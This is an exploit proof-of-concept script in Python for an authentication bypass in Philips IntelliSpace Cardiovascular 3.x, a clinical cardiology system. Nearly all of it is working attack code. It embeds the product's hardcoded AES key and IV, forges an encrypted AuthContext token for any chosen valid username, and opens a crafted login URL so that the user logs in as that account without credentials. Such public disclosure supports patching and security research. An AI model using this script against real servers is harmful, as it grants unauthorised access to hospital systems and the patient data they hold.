# Exploit Title: Authentication Bypass Vulnerability in Philips IntelliSpace Cardiovascular
# Date: 2024-12-09
# Exploit Author: Joe Dillon
# Vendor Homepage: https://www.philips.ca/healthcare/product/HCNOCTN198/intellispace-cardiovascular
# Version: 3.x
# Tested on: Windows Server 2016

# This script generates a forged URL that will authenticate to ISCV as a given user.  Username MUST
# be a valid ISCV user.

import datetime
import base64
import urllib.parse
import webbrowser
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

parser = argparse.ArgumentParser(description="exploit for iscv")
parser.add_argument("-d", "--domain")
parser.add_argument("-u", "--username")
parser.add_argument("-s", "--server")
args = parser.parse_args()

domain = args.domain.upper()
username = args.username.upper()
timestamp = datetime.datetime.now()
timestamp_formatted = timestamp \
  .strftime("%m/%d/%Y %l:%M:%S %p") \
  .replace("  ", " ")
payload = f"{domain}\\{username};{timestamp_formatted}"

plaintext = payload.encode(encoding="utf-16le")
key = bytes([
  0x54, 0xca, 0x19, 0xea, 0xc6, 0xf9, 0xdf, 0x9b,
  0xc3, 0xc4, 0x9b, 0xde, 0x8f, 0xd3, 0x58, 0xcc
])
iv = bytes([
  0xc6, 0xf9, 0xdf, 0x9b, 0x92, 0x04, 0x69, 0x0b,
  0xea, 0xe7, 0x60, 0x33, 0x5c, 0x3e, 0x7b, 0x6d
])
encryptor = AES.new(key, AES.MODE_CBC, IV=iv)
ciphertext = encryptor.encrypt(pad(plaintext, 16, style="pkcs7"))

server = args.server.upper()
authcontext = base64.b64encode(ciphertext)
params = urllib.parse.urlencode((
  ("AuthContext", authcontext),
  ("wctx", "rm=0&id=passive&ru=%2fISCV%2f"),
  ("wa", "wsignin1.0"),
  ("wct", timestamp.strftime("%Y-%m-%dT%R:%SZ")),
  ("wtrealm", f"https://{server}/ISCV/")
))
url = f"https://{server}/STS/Forms/Login.aspx?{params}"
print(f"Launching {url} in default browser...")
webbrowser.open(url, new=0, autoraise=True)
